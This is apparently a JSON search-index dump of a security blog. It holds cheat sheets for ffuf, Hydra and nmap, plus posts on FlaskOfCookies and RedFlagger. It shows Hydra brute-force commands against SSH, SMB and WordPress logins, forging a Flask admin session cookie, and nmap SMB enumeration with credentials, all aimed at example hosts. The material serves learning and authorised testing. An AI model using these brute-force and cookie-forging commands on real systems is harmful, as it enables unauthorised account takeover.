style=\"color:#ae81ff\"\u003e401\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch2 id=\"common-flags\"\u003eCommon Flags\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-c\u003c/code\u003e\u003c/strong\u003e: Enable colorized output.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-maxtime\u003c/code\u003e\u003c/strong\u003e: Set the maximum runtime for the process in seconds.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-p\u003c/code\u003e\u003c/strong\u003e: Set a delay between requests (e.g., \u003ccode\u003e0.1\u003c/code\u003e seconds).\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-v\u003c/code\u003e\u003c/strong\u003e: Verbose output.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-t\u003c/code\u003e\u003c/strong\u003e: Number of threads (default is 40).\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-mc\u003c/code\u003e\u003c/strong\u003e: Match specific HTTP status codes (e.g., \u003ccode\u003e200\u003c/code\u003e, \u003ccode\u003e301\u003c/code\u003e, \u003ccode\u003e403\u003c/code\u003e, or \u003ccode\u003eall\u003c/code\u003e).\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-fc\u003c/code\u003e\u003c/strong\u003e: Filter out responses by HTTP status codes.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-w\u003c/code\u003e\u003c/strong\u003e: Specify the wordlist path.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-u\u003c/code\u003e\u003c/strong\u003e: Define the target URL.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-s\u003c/code\u003e\u003c/strong\u003e: Enable silent mode.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-recursion\u003c/code\u003e\u003c/strong\u003e: Enable recursive fuzzing.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-r\u003c/code\u003e\u003c/strong\u003e: Follow redirects.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-o\u003c/code\u003e\u003c/strong\u003e: Output results to a file.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-of\u003c/code\u003e\u003c/strong\u003e: Specify output format (e.g., \u003ccode\u003ejson\u003c/code\u003e, \u003ccode\u003ehtml\u003c/code\u003e, \u003ccode\u003ecsv\u003c/code\u003e, \u003ccode\u003eall\u003c/code\u003e).\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-b\u003c/code\u003e\u003c/strong\u003e: Include cookies in the request.\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"examples-1\"\u003eExamples\u003c/h2\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# Match all responses, filter 42-byte answers, output colored and verbose\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003effuf -w wordlist.txt -u https://example.org/FUZZ -mc all -fs \u003cspan style=\"color:#ae81ff\"\u003e42\u003c/span\u003e -c -v\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# Fuzz host headers and show only status 200 responses\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003effuf -w hosts.txt -u https://example.org/ -H \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;Host: FUZZ\u0026#34;\u003c/span\u003e -mc \u003cspan style=\"color:#ae81ff\"\u003e200\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# Fuzz the `name` field in a POST request with JSON data, filter responses containing \u0026#34;error\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003effuf -w entries.txt -u https://example.org/ -X POST -H \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;Content-Type: application/json\u0026#34;\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#ae81ff\"\u003e\u003c/span\u003e-d \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;{\u0026#34;name\u0026#34;: \u0026#34;FUZZ\u0026#34;, \u0026#34;anotherkey\u0026#34;: \u0026#34;anothervalue\u0026#34;}\u0026#39;\u003c/span\u003e -fr \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;error\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# Use two wordlists for parameter and value fuzzing, match responses containing \u0026#34;VAL\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003effuf -w params.txt:PARAM -w values.txt:VAL -u https://example.org/?PARAM\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003eVAL -mr \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;VAL\u0026#34;\u003c/span\u003e -c\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch2 id=\"tips-and-tricks\"\u003eTips and Tricks\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eInteractive Mode\u003c/strong\u003e: Press \u003ccode\u003eEnter\u003c/code\u003e while FFUF is running to access interactive features, such as reconfiguring filters or saving the state.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eMultiple Payloads\u003c/strong\u003e: Use the \u003ccode\u003eFUZZ\u003c/code\u003e keyword multiple times in a URL (e.g., \u003ccode\u003ehttps://example.org/path/FUZZ/another_path/FUZZ\u003c/code\u003e).\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eVariables in URLs\u003c/strong\u003e: Specify payload locations using variables (e.g., \u003ccode\u003ehttps://example.org/path/{var1}/another_path/{var2}\u003c/code\u003e).\u003c/li\u003e\n\u003c/ul\u003e","title":"ffuf"},{"content":"Flask web applications are clever beasts, storing session data client-side in cookies. It’s convenient for developers, but it can also be a security rabbit hole if you’re not careful. That’s why I put together FlaskOfCookies, a tool to help you decode, encode, and (if necessary) brute-force Flask session cookies.\nTo be clear, this isn’t entirely my invention. It started because I hit a wall on a Root-Me challenge, I couldn’t get it done with noraj’s tool (props to Alexandre Zanni for his great work). So, I decided to rework it, adding my own spin to tackle the issue. This tool is for anyone who’s curious about Flask’s session cookies, whether you’re debugging, testing, or just poking around.\nWhy Session Cookies Matter Session cookies in Flask encode data into a compact, URL-safe string. They’re handy for keeping track of users or passing small pieces of data between the client and server. But they also mean your data sits in plain sight. If you’re not careful with what you store—or if your secret key isn’t strong—those cookies can tell stories you’d rather keep quiet.\nWhat Does FlaskOfCookies Do? Decoding Cookies FlaskOfCookies can crack open a Flask session cookie and show you the contents. If you have the secret key, it’ll reconstruct the original session data. Without the key, it’ll still give you a peek at the encoded structure. This is helpful for:\nChecking if sensitive information is leaking. Testing whether session data is being properly secured. Encoding Cookies Need to create a Flask-compatible session cookie? FlaskOfCookies takes a Python dictionary and a secret key as input and spits out a session cookie. This is handy if you’re:\nDebugging session handling in your app. Seeing how different data structures get encoded. Brute-Forcing Secret Keys If you don’t know the secret key, FlaskOfCookies can try to guess it for you. Just supply a wordlist, and the tool will hammer away until it finds a match (or gives up). This isn’t a feature for cracking into random apps; it’s a wake-up call to use strong, random keys. If you’re using “password123” for your Flask secret, consider yourself warned.\nHow It Works FlaskOfCookies is built on Flask’s session-handling mechanisms and the itsdangerous library, which Flask uses under the hood. It aligns with Flask’s default behavior, including the cookie-session salt, to make sure the results match what Flask itself would produce.\nHere’s the general flow:\nDecoding: The tool parses the encoded cookie value, optionally verifying it against a provided secret key. Encoding: It serializes a Python dictionary into a session cookie using Flask-compatible methods. Brute-Forcing: Tries every key in your wordlist to find the one that correctly decodes the cookie. It’s straightforward, with clear error messages and input validation to keep things manageable.\nWhy Use FlaskOfCookies? Honestly, this is more of a “because I had to” kind of tool. After struggling with the Root-Me challenge and realizing noraj’s tool wasn’t working for me, I figured I’d make something myself. FlaskOfCookies won’t win awards, but it’s lightweight, easy to use, and gives you insight into how Flask manages session cookies. Whether you’re a Flask developer or a security researcher, it can help you:\nLearn how session cookies work. Test your app for key management flaws. Debug session-related bugs. Getting Started with FlaskOfCookies First, make sure you have Python 3.x installed. You’ll also need Flask and itsdangerous:\npip install Flask itsdangerous Then, grab FlaskOfCookies from the repository:\ngit clone https://github.com/noobosaurus-r3x/FlaskOfCookies cd FlaskOfCookies Alternatively, you can download the FOC.py script directly.\nWhat You Can Do With It Here’s a quick guide to the tool’s commands:\nDecode a Session Cookie If you know the secret key:\npython3 FOC.py decode -s \u0026#39;\u0026lt;secret_key\u0026gt;\u0026#39; -c \u0026#39;\u0026lt;cookie_value\u0026gt;\u0026#39; Without the key, you can still see the structure:\npython3 FOC.py decode -c \u0026#39;\u0026lt;cookie_value\u0026gt;\u0026#39; Encode a Session Cookie To create a new session cookie:\npython3 FOC.py encode -s \u0026#39;\u0026lt;secret_key\u0026gt;\u0026#39; -t \u0026#34;{\u0026#39;username\u0026#39;:\u0026#39;admin\u0026#39;,\u0026#39;role\u0026#39;:\u0026#39;superuser\u0026#39;}\u0026#34; Brute-Force the Secret Key To test key strength with a wordlist:\npython3 FOC.py bruteforce -c \u0026#39;\u0026lt;cookie_value\u0026gt;\u0026#39; -w \u0026#39;\u0026lt;path_to_wordlist\u0026gt;\u0026#39; Final Thoughts FlaskOfCookies isn’t groundbreaking, but it’s a practical little tool for anyone exploring Flask session cookies. Whether you’re trying to figure out how they work, testing your app’s security, or debugging a frustrating challenge, it’ll save you some time.\nRemember, this started as a personal project to solve a specific problem, so don’t expect perfection. That said, I hope it’s useful—and if you think of ways to improve it, feel free to fork the repo and go wild. You can find it here.\n","permalink":"http://localhost:1313/tools/flask_of_cookies/","summary":"\u003cp\u003eFlask web applications are clever beasts, storing session data client-side in cookies. It’s convenient for developers, but it can also be a security rabbit hole if you’re not careful. That’s why I put together \u003cstrong\u003eFlaskOfCookies\u003c/strong\u003e, a tool to help you decode, encode, and (if necessary) brute-force Flask session cookies.\u003c/p\u003e\n\u003cp\u003eTo be clear, this isn’t entirely my invention. It started because I hit a wall on a \u003cstrong\u003eRoot-Me challenge\u003c/strong\u003e, I couldn’t get it done with \u003cstrong\u003enoraj’s tool\u003c/strong\u003e (props to Alexandre Zanni for his great work). So, I decided to rework it, adding my own spin to tackle the issue. This tool is for anyone who’s curious about Flask’s session cookies, whether you’re debugging, testing, or just poking around.\u003c/p\u003e","title":"FlaskOfCookies"},{"content":"Hydra is a password-cracking tool designed for brute-forcing authentication protocols. It supports a wide range of protocols and is highly configurable for various use cases.\nBasic Syntax hydra [options] \u0026lt;IP\u0026gt; \u0026lt;protocol\u0026gt; Common Flags -h: Display the help menu. -l \u0026lt;username\u0026gt;: Specify a single username/login. -L \u0026lt;wordlist\u0026gt;: Use a wordlist for usernames/logins. -p \u0026lt;password\u0026gt;: Specify a single password. -P \u0026lt;wordlist\u0026gt;: Use a wordlist for passwords. -s \u0026lt;PORT\u0026gt;: Specify the target port. -f: Stop brute-forcing after finding valid credentials. -R: Restore a previous session. -t \u0026lt;number\u0026gt;: Set the number of threads to use. -V: Enable verbose mode. Supported Protocols Hydra supports numerous protocols, including:\nSSH FTP POP3 HTTP-FORM-GET HTTP-FORM-POST HTTP-HEAD HTTP-POST HTTP-GET IMAP SMB SMTP MySQL For the full list, refer to Hydra\u0026rsquo;s help menu (hydra -h).\nExamples SSH Brute-Force Attack hydra -l admin -P rockyou.txt 192.168.10.10 ssh SSH with Multiple Usernames hydra -L top-usernames-shortlist.txt -P rockyou.txt 192.168.10.10 ssh SMB Brute-Force Attack hydra -L top-usernames-shortlist.txt -P rockyou.txt 192.168.10.10 smb Brute-Forcing HTTP POST Forms Hydra can handle custom HTTP POST forms:\nhydra -l admin -P rockyou.txt 192.168.10.10 http-post-form \\ \u0026#34;/login:username=admin\u0026amp;password=^PASS^:F=Your password is incorrect\u0026#34; Wordpress Login Brute-Force Hydra can target WordPress login forms with custom parameters:\nhydra -l admin -P rockyou.txt 192.168.10.10 -V http-form-post \\ \u0026#34;/wp-login.php:log=admin\u0026amp;pwd=^PASS^\u0026amp;wp-submit=Log In\u0026amp;testcookie=1:S=Location\u0026#34; Tips and Tricks Session Management: Use -R to restore interrupted sessions without starting over. Efficiency: Adjust the number of threads with -t to balance speed and server load. Verbose Mode: Use -V to see each login attempt in real-time, useful for troubleshooting. Custom Form Parameters: Understand the target login form structure to craft precise Hydra commands. \u0026ndash;\n","permalink":"http://localhost:1313/cheat-sheets/hydra/","summary":"\u003cp\u003e\u003cstrong\u003eHydra\u003c/strong\u003e is a password-cracking tool designed for brute-forcing authentication protocols. It supports a wide range of protocols and is highly configurable for various use cases.\u003c/p\u003e\n\u003ch2 id=\"basic-syntax\"\u003eBasic Syntax\u003c/h2\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ehydra \u003cspan style=\"color:#f92672\"\u003e[\u003c/span\u003eoptions\u003cspan style=\"color:#f92672\"\u003e]\u003c/span\u003e \u0026lt;IP\u0026gt; \u0026lt;protocol\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch2 id=\"common-flags\"\u003eCommon Flags\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-h\u003c/code\u003e\u003c/strong\u003e: Display the help menu.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-l \u0026lt;username\u0026gt;\u003c/code\u003e\u003c/strong\u003e: Specify a single username/login.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-L \u0026lt;wordlist\u0026gt;\u003c/code\u003e\u003c/strong\u003e: Use a wordlist for usernames/logins.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-p \u0026lt;password\u0026gt;\u003c/code\u003e\u003c/strong\u003e: Specify a single password.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-P \u0026lt;wordlist\u0026gt;\u003c/code\u003e\u003c/strong\u003e: Use a wordlist for passwords.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-s \u0026lt;PORT\u0026gt;\u003c/code\u003e\u003c/strong\u003e: Specify the target port.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-f\u003c/code\u003e\u003c/strong\u003e: Stop brute-forcing after finding valid credentials.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-R\u003c/code\u003e\u003c/strong\u003e: Restore a previous session.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-t \u0026lt;number\u0026gt;\u003c/code\u003e\u003c/strong\u003e: Set the number of threads to use.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-V\u003c/code\u003e\u003c/strong\u003e: Enable verbose mode.\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"supported-protocols\"\u003eSupported Protocols\u003c/h2\u003e\n\u003cp\u003eHydra supports numerous protocols, including:\u003c/p\u003e","title":"Hydra"},{"content":"Basic Syntax nmap \u0026lt;target IP\u0026gt; nmap -sT -sS -Pn -v 10.10.10.10 sudo nmap -A -sS -Pn 10.10.10.10 sudo nmap -sV -sT -O -p- -vv --script vulners 10.10.10.10 Common Flags Scan Types -sT: Perform a TCP connect scan. -sU: Perform a UDP scan. -sS: Perform a SYN scan (\u0026ldquo;Stealth Scan\u0026rdquo;). -Pn: Skip pinging the target. -sn: Host discovery without scanning ports. -A: Enable aggressive scan options. Advanced Features -p \u0026lt;PORT\u0026gt;: Scan specific ports. -p-: Scan all 65,535 ports. -sV: Detect services and versions running on the target. -O: Detect the operating system. -v****, -vv, ********-vvv: Set verbosity levels. --script vuln: Run vulnerability scripts. --script vulners: Use vulners scripts for CVE-based scanning. --script=http-enum: Act like Nikto to enumerate HTTP resources. Output Formats -oN: Normal text output, best for human-readable logs during manual reviews. -oX: XML output, ideal for automated tools or integrations that require structured data. ``: Greppable output, useful for scripting and quickly filtering resulst with tools like grep. -oA: Generate all three formats at once, providing maximum flexibility for further analysis or reporting. SMB Scripts Enumerate Security Mode nmap -p445 --script smb-security-mode 192.168.1.1 Enumerate Sessions nmap -p445 --script smb-enum-sessions 192.168.1.1 nmap -p445 --script smb-enum-sessions --script-args smbusername=administrator,smbpassword=password 192.168.1.1 Enumerate Shares nmap -p445 --script smb-enum-shares 192.168.1.1 nmap -p445 --script smb-enum-shares --script-args smbusername=administrator,smbpassword=password 192.168.1.1 Enumerate Shares with Listing Listing shares and their contents can reveal valuable information about a system, such as misconfigured permissions or sensitive files stored in shared directories. This is especially important during audits or penetration tests to identify potential security gaps.\nnmap -p445 --script smb-enum-shares,smb-ls --script-args smbusername=administrator,smbpassword=password 192.168.1.1 Enumerate Users nmap -p445 --script smb-enum-users --script-args smbusername=administrator,smbpassword=password 192.168.1.1 Enumerate Stats nmap -p445 --script smb-enum-stats --script-args smbusername=administrator,smbpassword=password 192.168.1.1 Enumerate Domains nmap -p445 --script smb-enum-domains --script-args smbusername=administrator,smbpassword=password 192.168.1.1 Enumerate Groups nmap -p445 --script smb-enum-groups --script-args smbusername=administrator,smbpassword=password 192.168.1.1 SSH Scripts Enumerate Algorithms nmap 192.168.1.1 -p 22 --script ssh2-enum-algos Enumerate Host Keys nmap 192.168.1.1 -p 22 --script ssh-hostkey --script-args ssh_hostkey=full Enumerate Authentication Methods nmap 192.168.1.1 -p 22 --script ssh-auth-methods --script-args=\u0026#34;ssh.user=admin\u0026#34; ","permalink":"http://localhost:1313/cheat-sheets/nmap/","summary":"\u003ch2 id=\"basic-syntax\"\u003eBasic Syntax\u003c/h2\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003enmap \u0026lt;target IP\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003enmap -sT -sS -Pn -v 10.10.10.10\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003esudo nmap -A -sS -Pn 10.10.10.10\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003esudo nmap -sV -sT -O -p- -vv --script vulners 10.10.10.10\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch2 id=\"common-flags\"\u003eCommon Flags\u003c/h2\u003e\n\u003ch3 id=\"scan-types\"\u003eScan Types\u003c/h3\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-sT\u003c/code\u003e\u003c/strong\u003e: Perform a TCP connect scan.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-sU\u003c/code\u003e\u003c/strong\u003e: Perform a UDP scan.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-sS\u003c/code\u003e\u003c/strong\u003e: Perform a SYN scan (\u0026ldquo;Stealth Scan\u0026rdquo;).\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-Pn\u003c/code\u003e\u003c/strong\u003e: Skip pinging the target.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-sn\u003c/code\u003e\u003c/strong\u003e: Host discovery without scanning ports.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-A\u003c/code\u003e\u003c/strong\u003e: Enable aggressive scan options.\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3 id=\"advanced-features\"\u003eAdvanced Features\u003c/h3\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-p \u0026lt;PORT\u0026gt;\u003c/code\u003e\u003c/strong\u003e: Scan specific ports.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-p-\u003c/code\u003e\u003c/strong\u003e: Scan all 65,535 ports.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-sV\u003c/code\u003e\u003c/strong\u003e: Detect services and versions running on the target.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-O\u003c/code\u003e\u003c/strong\u003e: Detect the operating system.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-v\u003c/code\u003e\u003c/strong\u003e\u003cstrong\u003e\u003cstrong\u003e\u003cstrong\u003e****, \u003cstrong\u003e\u003cstrong\u003e\u003cstrong\u003e\u003cstrong\u003e\u003cstrong\u003e\u003cstrong\u003e\u003cstrong\u003e\u003cstrong\u003e\u003cstrong\u003e\u003cstrong\u003e\u003cstrong\u003e\u003cstrong\u003e\u003cstrong\u003e\u003cstrong\u003e\u003cstrong\u003e\u003cstrong\u003e\u003cstrong\u003e\u003cstrong\u003e\u003cstrong\u003e\u003cstrong\u003e\u003cstrong\u003e\u003cstrong\u003e\u003ccode\u003e-vv\u003c/code\u003e\u003c/strong\u003e\u003c/strong\u003e\u003c/strong\u003e\u003c/strong\u003e\u003c/strong\u003e\u003c/strong\u003e\u003c/strong\u003e\u003c/strong\u003e\u003c/strong\u003e\u003c/strong\u003e\u003c/strong\u003e\u003c/strong\u003e\u003c/strong\u003e\u003c/strong\u003e\u003c/strong\u003e\u003c/strong\u003e\u003c/strong\u003e\u003c/strong\u003e\u003c/strong\u003e\u003c/strong\u003e\u003c/strong\u003e\u003c/strong\u003e, ****\u003c/strong\u003e\u003c/strong\u003e\u003c/strong\u003e\u003cstrong\u003e\u003cstrong\u003e\u003cstrong\u003e****\u003c/strong\u003e\u003c/strong\u003e\u003c/strong\u003e\u003cstrong\u003e\u003ccode\u003e-vvv\u003c/code\u003e\u003c/strong\u003e: Set verbosity levels.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e--script vuln\u003c/code\u003e\u003c/strong\u003e: Run vulnerability scripts.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e--script vulners\u003c/code\u003e\u003c/strong\u003e: Use vulners scripts for CVE-based scanning.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e--script=http-enum\u003c/code\u003e\u003c/strong\u003e: Act like Nikto to enumerate HTTP resources.\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"output-formats\"\u003eOutput Formats\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-oN\u003c/code\u003e\u003c/strong\u003e: Normal text output, best for human-readable logs during manual reviews.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-oX\u003c/code\u003e\u003c/strong\u003e: XML output, ideal for automated tools or integrations that require structured data.\u003c/li\u003e\n\u003cli\u003e``: Greppable output, useful for scripting and quickly filtering resulst with tools like \u003ccode\u003egrep\u003c/code\u003e.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-oA\u003c/code\u003e\u003c/strong\u003e: Generate all three formats at once, providing maximum flexibility for further analysis or reporting.\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"smb-scripts\"\u003eSMB Scripts\u003c/h2\u003e\n\u003ch3 id=\"enumerate-security-mode\"\u003eEnumerate Security Mode\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003enmap -p445 --script smb-security-mode 192.168.1.1\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"enumerate-sessions\"\u003eEnumerate Sessions\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003enmap -p445 --script smb-enum-sessions 192.168.1.1\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003enmap -p445 --script smb-enum-sessions --script-args smbusername\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003eadministrator,smbpassword\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003epassword 192.168.1.1\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"enumerate-shares\"\u003eEnumerate Shares\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003enmap -p445 --script smb-enum-shares 192.168.1.1\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003enmap -p445 --script smb-enum-shares --script-args smbusername\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003eadministrator,smbpassword\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003epassword 192.168.1.1\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"enumerate-shares-with-listing\"\u003eEnumerate Shares with Listing\u003c/h3\u003e\n\u003cp\u003eListing shares and their contents can reveal valuable information about a system, such as misconfigured permissions or sensitive files stored in shared directories. This is especially important during audits or penetration tests to identify potential security gaps.\u003c/p\u003e","title":"nmap"},{"content":"Daily domain reports are a treasure trove for cybersecurity analysts, but collecting and organizing them can quickly become tedious. That’s where RedFlagger comes in. This lightweight Bash script automates the process of downloading and aggregating reports from Red Flag Domains. It’s simple, efficient, and built to save time—whether you’re sifting through a few recent reports or analyzing a year’s worth of data.\nThe Backstory This project started as a bit of a joke. My friend lil-doudou had written an excellent Python tool called NewRedflag to handle domain report aggregation, but he’s also a massive Bash enthusiast. So, as a playful nod to his love for scripting, I decided to rewrite the functionality in Bash—simpler, lighter, and arguably more fun (depending on your feelings about shell scripts).\nWhat Does RedFlagger Do? RedFlagger streamlines the process of collecting domain reports. Instead of manually navigating the Red Flag Domains website and downloading reports one by one, you can use RedFlagger to:\nFetch the latest report. Download reports from a specific range of dates. Aggregate all available reports into one file for easier analysis. It’s a no-frills script that prioritizes functionality and flexibility.\nHow Does It Work? RedFlagger fetches reports directly from the Red Flag Domains website by parsing the daily directory. It uses simple Bash commands like curl to download files and aggregates them into a single output file for easy handling. If you’re running a quick analysis or building a dataset for long-term research, this script has you covered.\nKey Features: Custom Date Ranges: Specify a range of days to download only the reports you need. All-Inclusive Downloads: Grab every report available with a single command. Custom Output Files: Aggregate data into a file of your choice instead of dealing with multiple separate files. Why Use RedFlagger? RedFlagger is built for simplicity and speed. It doesn’t aim to replace more advanced tools but instead provides a lightweight option for users who need quick, automated access to domain reports. If you find yourself regularly pulling data from Red Flag Domains, RedFlagger can:\nSave time by automating the download process. Ensure reports are organized and aggregated for easier analysis. Provide flexible options for handling specific dates or all available data. Whether you’re an analyst tracking malicious domains or a researcher building a threat intelligence dataset, RedFlagger can fit seamlessly into your workflow.\nGetting Started Installation RedFlagger is a standalone Bash script, so there’s no complicated setup. Here’s how to get started:\nDownload the script:\ngit clone https://github.com/noobosaurus-r3x/redflagger cd redflagger chmod +x redflagger.sh Make sure curl is installed on your system:\nsudo apt 